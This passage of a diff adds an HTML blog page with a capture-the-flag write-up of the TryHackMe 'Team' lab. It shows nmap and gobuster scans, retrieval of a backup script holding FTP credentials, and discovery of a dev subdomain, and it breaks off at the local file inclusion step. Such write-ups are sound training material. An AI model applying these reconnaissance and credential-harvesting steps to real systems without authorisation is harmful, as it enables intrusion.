@@ -1,0 +1,2106 @@
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#0e174e" />
+  
+  <title>Team — TryHackMe &middot; k40t1k</title>
+    <meta name="title" content="Team — TryHackMe &middot; k40t1k" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="http://localhost:1313/js/appearance.min.8a082f81b27f3cb2ee528df0b0bdc39787034cf2cc34d4669fbc9977c929023c.js"
+    integrity="sha256-iggvgbJ/PLLuUo3wsL3Dl4cDTPLMNNRmn7yZd8kpAjw="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="http://localhost:1313/css/main.bundle.min.77a79972dfd1fba3e37eaab972e5cf479aea24376fc39d827f5760735ebc834e.css"
+    integrity="sha256-d6eZct/R&#43;6Pjfqq5cuXPR5rqJDdvw52Cf1dgc168g04="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        
+      
+    "
+  />
+  
+  
+  
+  
+    <link rel="canonical" href="http://localhost:1313/posts/team-tryhackme/" />
+  
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="http://localhost:1313/posts/team-tryhackme/">
+  <meta property="og:site_name" content="k40t1k">
+  <meta property="og:title" content="Team — TryHackMe">
+  <meta property="og:description" content="My awesome website">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-07-02T11:43:00+03:00">
+    <meta property="article:modified_time" content="2026-07-02T11:43:00+03:00">
+    <meta property="article:tag" content="TryHackMe">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Boot2root">
+    <meta property="article:tag" content="Easy">
+    <meta property="article:tag" content="FTP">
+    <meta property="article:tag" content="Path Traversal">
+    <meta property="og:image" content="http://localhost:1313/posts/team-tryhackme/feature.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/posts/team-tryhackme/feature.png">
+  <meta name="twitter:title" content="Team — TryHackMe">
+  <meta name="twitter:description" content="My awesome website">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog",
+    "name": "Team — TryHackMe",
+    "headline": "Team — TryHackMe",
+    
+    
+    "inLanguage": "en",
+    "url" : "http:\/\/localhost:1313\/posts\/team-tryhackme\/",
+    "author" : {
+      "@type": "Person",
+      "name": "k40t1k"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-07-02T11:43:00\u002b03:00",
+    "datePublished": "2026-07-02T11:43:00\u002b03:00",
+    
+    "dateModified": "2026-07-02T11:43:00\u002b03:00",
+    
+    "keywords": ["TryHackMe","Linux","Boot2Root","Easy","FTP","Path Traversal","Sudo Misconfiguration","Cron Job","Privilege Escalation","CTF Writeup"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "572"
+  }
+  </script>
+    
+    <script type="application/ld+json">
+    {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/",
+       "name": "K40t1k",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/posts/",
+       "name": "Blog",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "name": "Team — Try Hack Me",
+       "position": 3
+     }
+   ]
+ }
+  </script>
+
+  
+  
+    <meta name="author" content="k40t1k" />
+  
+  
+    
+      <link href="https://github.com/jkilonzi" rel="me" />
+    
+      <link href="https://linkedin.com/in/john-maluki" rel="me" />
+    
+      <link href="https://medium.com/@jkilonzi301" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >k40t1k</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/about/"
+                  title="About"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >About</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/posts/"
+                  title="Blog"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/resources/"
+                  title="Resources"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Resources</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/certificates/"
+                  title="Certificates"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Certificates</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Team — TryHackMe
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-07-02 11:43:00 &#43;0300 EAT">2 July 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+        <div class="prose">
+          
+          
+          
+          
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mb-6 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/team-tryhackme/feature_hu_16df2513bcbd5182.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="150"
+        height="150"
+        class="mb-6 rounded-md"
+        
+        
+        
+          src="http://localhost:1313/posts/team-tryhackme/feature.png"
+        
+      />
+    </picture>
+  
+
+
+          
+        </div>
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8 self-start">
+          <div class="toc pe-5 sticky top-20 overflow-y-auto max-h-[calc(100vh-6rem)] print:hidden">
+            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5">
+  <summary
+    class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#step-1-reconnaissance-and-enumeration">Step 1: Reconnaissance and Enumeration</a>
+      <ul>
+        <li><a href="#port-80--web-service">Port 80 — Web Service</a></li>
+        <li><a href="#scripts--backup-discovery">/scripts — Backup Discovery</a></li>
+        <li><a href="#ftp-port-21">FTP (Port 21)</a></li>
+        <li><a href="#devteamthm--local-file-inclusion">dev.team.thm — Local File Inclusion</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-2-initial-access">Step 2: Initial Access</a></li>
+    <li><a href="#step-3-lateral-movement--dale-to-gyles">Step 3: Lateral Movement — dale to gyles</a></li>
+    <li><a href="#step-4-privilege-escalation--gyles-to-root">Step 4: Privilege Escalation — gyles to root</a></li>
+    <li><a href="#conclusion">Conclusion</a>
+      <ul>
+        <li><a href="#remediations">Remediations</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <h2 id="overview" class="relative group">Overview <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#overview" aria-label="Anchor">#</a></span></h2><p>Beginner friendly boot2root machine. The attack chain involves discovering FTP credentials in exposed backup files, enumerating a subdomain via FTP, exploiting a local file inclusion vulnerability to leak SSH keys, and leveraging sudo and cron misconfigurations to escalate to root.</p>
+<h2 id="step-1-reconnaissance-and-enumeration" class="relative group">Step 1: Reconnaissance and Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-1-reconnaissance-and-enumeration" aria-label="Anchor">#</a></span></h2><p>The assessment began with an nmap scan against the target IP to identify running services and potential entry points.</p>
+<pre tabindex="0"><code>nmap -sV -sC &lt;target_ip&gt;
+</code></pre><pre tabindex="0"><code>PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.5
+22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
+</code></pre><p><strong>Key Findings:</strong></p>
+<ul>
+<li>FTP (port 21) — vsftpd 3.0.5</li>
+<li>SSH (port 22) — OpenSSH 8.2p1</li>
+<li>HTTP (port 80) — Apache 2.4.41</li>
+</ul>
+<h3 id="port-80--web-service" class="relative group">Port 80 — Web Service <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#port-80--web-service" aria-label="Anchor">#</a></span></h3><p>The target IP was added to the hosts file as <code>team.thm</code>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/team-tryhackme/port80-page_hu_dd1e04167adf0ceb.webp 330w,http://localhost:1313/posts/team-tryhackme/port80-page_hu_679784947e6801e6.webp 660w
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/port80-page_hu_2e4136b996255b56.webp 808w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/port80-page_hu_2e4136b996255b56.webp 808w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="808"
+        height="92"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/port80-page_hu_b549fe84c631b07.png" srcset="http://localhost:1313/posts/team-tryhackme/port80-page_hu_dc3f9360a2431779.png 330w,http://localhost:1313/posts/team-tryhackme/port80-page_hu_b549fe84c631b07.png 660w
+          
+            ,http://localhost:1313/posts/team-tryhackme/port80-page.png 808w
+          
+          
+            ,http://localhost:1313/posts/team-tryhackme/port80-page.png 808w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/team-tryhackme/hosts-file_hu_dcea6954e8625484.webp 330w,http://localhost:1313/posts/team-tryhackme/hosts-file_hu_4a1879a74675a4af.webp 660w
+            
+              ,http://localhost:1313/posts/team-tryhackme/hosts-file_hu_809798f835194a0e.webp 1024w
+            
+            
+              ,http://localhost:1313/posts/team-tryhackme/hosts-file_hu_84ec9196195f78ff.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1876"
+        height="829"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/hosts-file_hu_dfd9e367ec5ca0b8.png" srcset="http://localhost:1313/posts/team-tryhackme/hosts-file_hu_edd2ecd29aeed196.png 330w,http://localhost:1313/posts/team-tryhackme/hosts-file_hu_dfd9e367ec5ca0b8.png 660w
+          
+            ,http://localhost:1313/posts/team-tryhackme/hosts-file_hu_e1cdba5a3ac71b54.png 1024w
+          
+          
+            ,http://localhost:1313/posts/team-tryhackme/hosts-file_hu_48be916ff844d488.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>A <strong>robots.txt</strong> file revealed a potential username — <code>dale</code>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/team-tryhackme/robots-txt_hu_78669017182ed693.webp 330w,http://localhost:1313/posts/team-tryhackme/robots-txt_hu_ee9ea48adaa7d829.webp 660w
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/robots-txt_hu_aa6263f9cdffab19.webp 719w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/robots-txt_hu_aa6263f9cdffab19.webp 719w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="719"
+        height="121"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/robots-txt_hu_b393c04c7004c374.png" srcset="http://localhost:1313/posts/team-tryhackme/robots-txt_hu_7dc951be98153536.png 330w,http://localhost:1313/posts/team-tryhackme/robots-txt_hu_b393c04c7004c374.png 660w
+          
+            ,http://localhost:1313/posts/team-tryhackme/robots-txt.png 719w
+          
+          
+            ,http://localhost:1313/posts/team-tryhackme/robots-txt.png 719w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>A <strong>gobuster</strong> directory scan discovered a <code>/scripts</code> directory.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/team-tryhackme/gobuster_hu_63271b725848651c.webp 330w,http://localhost:1313/posts/team-tryhackme/gobuster_hu_6e3f0ad28beed00a.webp 660w
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/gobuster_hu_be9261f5c63b98ba.webp 727w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/gobuster_hu_be9261f5c63b98ba.webp 727w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="727"
+        height="296"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/gobuster_hu_88ce653a9dfeb74a.png" srcset="http://localhost:1313/posts/team-tryhackme/gobuster_hu_afe2430c2c09d6d5.png 330w,http://localhost:1313/posts/team-tryhackme/gobuster_hu_88ce653a9dfeb74a.png 660w
+          
+            ,http://localhost:1313/posts/team-tryhackme/gobuster.png 727w
+          
+          
+            ,http://localhost:1313/posts/team-tryhackme/gobuster.png 727w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<pre tabindex="0"><code>gobuster dir -u http://team.thm/scripts -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .txt,php
+</code></pre><h3 id="scripts--backup-discovery" class="relative group">/scripts — Backup Discovery <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#scripts--backup-discovery" aria-label="Anchor">#</a></span></h3><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/team-tryhackme/scripts-page_hu_6f83dfd2f88f9afd.webp 330w,http://localhost:1313/posts/team-tryhackme/scripts-page_hu_ce3a6c457627ee7d.webp 660w
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/scripts-page_hu_6e100a7f83086325.webp 768w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/scripts-page_hu_6e100a7f83086325.webp 768w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="768"
+        height="377"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/scripts-page_hu_95ba3e34cdb63284.png" srcset="http://localhost:1313/posts/team-tryhackme/scripts-page_hu_9767a1add81181d5.png 330w,http://localhost:1313/posts/team-tryhackme/scripts-page_hu_95ba3e34cdb63284.png 660w
+          
+            ,http://localhost:1313/posts/team-tryhackme/scripts-page.png 768w
+          
+          
+            ,http://localhost:1313/posts/team-tryhackme/scripts-page.png 768w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Inside <code>/scripts</code>, the file <code>script.txt</code> contained a hint on its last line suggesting an older version existed.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/team-tryhackme/script-txt-hint_hu_d7b3f889660d29ae.webp 330w,http://localhost:1313/posts/team-tryhackme/script-txt-hint_hu_c4fd530321739932.webp 660w
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/script-txt-hint_hu_d37fe878493a42da.webp 887w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/script-txt-hint_hu_d37fe878493a42da.webp 887w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="887"
+        height="370"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/script-txt-hint_hu_a2e3354a759bad82.png" srcset="http://localhost:1313/posts/team-tryhackme/script-txt-hint_hu_4b4dce20581075eb.png 330w,http://localhost:1313/posts/team-tryhackme/script-txt-hint_hu_a2e3354a759bad82.png 660w
+          
+            ,http://localhost:1313/posts/team-tryhackme/script-txt-hint.png 887w
+          
+          
+            ,http://localhost:1313/posts/team-tryhackme/script-txt-hint.png 887w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Downloading the <code>.old</code> version.</p>
+<pre tabindex="0"><code>wget http://team.thm/scripts/script.old
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/team-tryhackme/search-dot-old_hu_458aa1db24e785ad.webp 330w,http://localhost:1313/posts/team-tryhackme/search-dot-old_hu_bcb5f8b011ec322b.webp 660w
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/search-dot-old_hu_4c9cca1353e477b4.webp 873w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/search-dot-old_hu_4c9cca1353e477b4.webp 873w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="873"
+        height="120"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/search-dot-old_hu_edf79c633cf4fc3d.png" srcset="http://localhost:1313/posts/team-tryhackme/search-dot-old_hu_66662863da03187f.png 330w,http://localhost:1313/posts/team-tryhackme/search-dot-old_hu_edf79c633cf4fc3d.png 660w
+          
+            ,http://localhost:1313/posts/team-tryhackme/search-dot-old.png 873w
+          
+          
+            ,http://localhost:1313/posts/team-tryhackme/search-dot-old.png 873w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+
+
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/team-tryhackme/script-old-download_hu_6e683cde00de1c44.webp 330w,http://localhost:1313/posts/team-tryhackme/script-old-download_hu_4477bf49d9849573.webp 660w
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/script-old-download_hu_88a519141613357e.webp 849w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/script-old-download_hu_88a519141613357e.webp 849w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="849"
+        height="181"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/script-old-download_hu_fed0b067249379db.png" srcset="http://localhost:1313/posts/team-tryhackme/script-old-download_hu_76438ae8c438909c.png 330w,http://localhost:1313/posts/team-tryhackme/script-old-download_hu_fed0b067249379db.png 660w
+          
+            ,http://localhost:1313/posts/team-tryhackme/script-old-download.png 849w
+          
+          
+            ,http://localhost:1313/posts/team-tryhackme/script-old-download.png 849w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+
+
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/team-tryhackme/script-old-content_hu_b670c508b6d36aa1.webp 330w,http://localhost:1313/posts/team-tryhackme/script-old-content_hu_b65dcb0dc3e579b4.webp 660w
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/script-old-content_hu_8c17f51b88ebab43.webp 725w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/script-old-content_hu_8c17f51b88ebab43.webp 725w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="725"
+        height="319"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/script-old-content_hu_934e862e04857561.png" srcset="http://localhost:1313/posts/team-tryhackme/script-old-content_hu_5bbcbf96515e107d.png 330w,http://localhost:1313/posts/team-tryhackme/script-old-content_hu_934e862e04857561.png 660w
+          
+            ,http://localhost:1313/posts/team-tryhackme/script-old-content.png 725w
+          
+          
+            ,http://localhost:1313/posts/team-tryhackme/script-old-content.png 725w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The <code>script.old</code> file contained FTP credentials.</p>
+<h3 id="ftp-port-21" class="relative group">FTP (Port 21) <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#ftp-port-21" aria-label="Anchor">#</a></span></h3><p>Using the recovered credentials, FTP access was gained.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/team-tryhackme/ftp-login_hu_d767826a58e9eb83.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="395"
+        height="132"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/ftp-login.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>A file titled <code>New_site.txt</code> was discovered on the FTP server.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/team-tryhackme/ftp-file-discovered_hu_a4f41eefe30c6d40.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="455"
+        height="82"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/ftp-file-discovered.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>This file revealed another username (<code>gyles</code>) and hinted at a <code>.dev</code> subdomain.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/team-tryhackme/new-site-txt_hu_f27a8da659758355.webp 330w,http://localhost:1313/posts/team-tryhackme/new-site-txt_hu_146b4d21380de1ff.webp 660w
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/new-site-txt_hu_74c3ce26a6b81d06.webp 1002w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/new-site-txt_hu_74c3ce26a6b81d06.webp 1002w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1002"
+        height="142"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/new-site-txt_hu_dfbd7da97c2184c7.png" srcset="http://localhost:1313/posts/team-tryhackme/new-site-txt_hu_c93e84fa5f9eda08.png 330w,http://localhost:1313/posts/team-tryhackme/new-site-txt_hu_dfbd7da97c2184c7.png 660w
+          
+            ,http://localhost:1313/posts/team-tryhackme/new-site-txt.png 1002w
+          
+          
+            ,http://localhost:1313/posts/team-tryhackme/new-site-txt.png 1002w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The subdomain was added to the hosts file.</p>
+<pre tabindex="0"><code>&lt;target_ip&gt; team.thm dev.team.thm
+</code></pre><h3 id="devteamthm--local-file-inclusion" class="relative group">dev.team.thm — Local File Inclusion <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#devteamthm--local-file-inclusion" aria-label="Anchor">#</a></span></h3><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/team-tryhackme/dev-subdomain_hu_db940567fb6ada2a.webp 330w,http://localhost:1313/posts/team-tryhackme/dev-subdomain_hu_f560f2553665de34.webp 660w
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/dev-subdomain_hu_1dec1ef558ba8078.webp 764w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/dev-subdomain_hu_1dec1ef558ba8078.webp 764w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="764"
+        height="132"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
